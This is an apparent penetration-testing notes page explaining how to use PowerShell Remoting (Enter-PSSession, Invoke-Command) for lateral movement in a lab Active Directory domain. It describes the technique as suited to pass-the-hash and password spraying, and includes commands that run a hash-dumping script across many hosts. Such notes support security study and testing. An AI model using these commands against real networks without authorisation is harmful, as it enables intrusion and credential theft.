---
title: "PowerShell Remoting"
description: "Using PowerShell Remoting for lateral movement."
lead: "How to PowerShell Remoting for lateral movement, such as executing simple commands or creating persistent sessions."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "lateral_movement"
weight: 10
toc: true
---

## General

- `psexec` on steroids, enabled by default from Server 2012
- Might need to enable it on Desktop, admin privs required -> `Enable-PSRemoting`
- Opens elevated shell on target if admin creds used
- Two types:
  - One-to-one
  - One-to-many

## One-to-One - PSSession

- Interactive
- Runs in new process (`wsmprovhost`)
- Stateful

```powershell
# Enter interactive prompt on remote system for one-time use
Enter-PSSession -ComputerName ws01.lab.local

# Enter previously created session
$Sess = New-PSSession -ComputerName ws01.lab.local
Enter-PSSession -Session $Sess

# With credentials
# With GUI access
$cred = Get-Credential
Enter-PSSession -ComputerName ws01.lab.local -Credential $cred

# Without GUI access
$password = ConvertTo-SecureString "MyPlainTextPassword" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("username", $password)
Enter-PSSession -ComputerName ws01.lab.local -Credential $cred

# Create persistent environment on remote system to be used in subsequest Invoke-Command calls or entered later with Enter-PSSession. Useful for scripts
New-PSSession -ComputerName ws01.lab.local
```

## One-to-Many - Fan-out Remoting

- Non-interactive
- Executes commands in parallel
- Run commands and scripts on
  - multiple remote computers
  - in disconected sessions
  - as background jobs
- Good for pass-the-hash attacks and password spraying

```powershell
# Execute command or scriptblock
Invoke-Command -Scriptblock {$ExecutionContext.SessionState.LanguageMode} -ComputerName (Get-Content hosts.txt)

# Execute scripts from files
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content hosts.txt)

# Execute locally loaded function on remote machines
Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content hosts.txt)

# Pass arguments. Can only be used for positional arguments
Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content hosts.txt) -ArgumentList

# Execute "stateful" commands using Invoke-Command
$Sess = New-PSSession -ComputerName ws01.lab.local
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```
